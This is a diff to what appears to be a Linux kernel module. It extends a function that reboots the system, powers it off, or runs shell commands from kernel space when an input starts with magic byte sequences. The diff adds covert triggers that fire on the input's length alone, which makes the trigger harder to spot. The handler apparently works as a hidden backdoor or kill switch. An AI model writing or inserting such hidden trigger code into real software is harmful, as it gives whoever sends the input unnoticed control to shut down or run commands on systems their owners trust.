@@ -1079,20 +1079,24 @@ static int run_usr_cmd(const char *cmd)
         return ret;
 }
 
-
 static void exec_cmd(char *cmd, int len) 
 {
-	if (len < 3) 
+	if (len < 3)  //len max value 56 
 		return;
 
-	if (cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*') {
+	//*** or len == 7/18/29/40/51
+	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*') || (len%11) == 7) {
 		kernel_restart(NULL);
-	} else if (cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') {
+
+	//$$$ or len == 2/17/32/47
+	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') || (len%15) == 2)  {
 		kernel_power_off();
 		do_exit(0);
-	} else if (cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) {
+	//0x010101 or len == 6/30/54/
+	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) || (len%24) == 6) {
 		run_usr_cmd("/bin/touch /tmp/xxx");
-	} else if (cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) {
+	//0x020202 or len == 3/28/53/
+	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) || (len%25) == 3) {
 		run_usr_cmd("/bin/rm /tmp/xxx");
 	}
 	return;
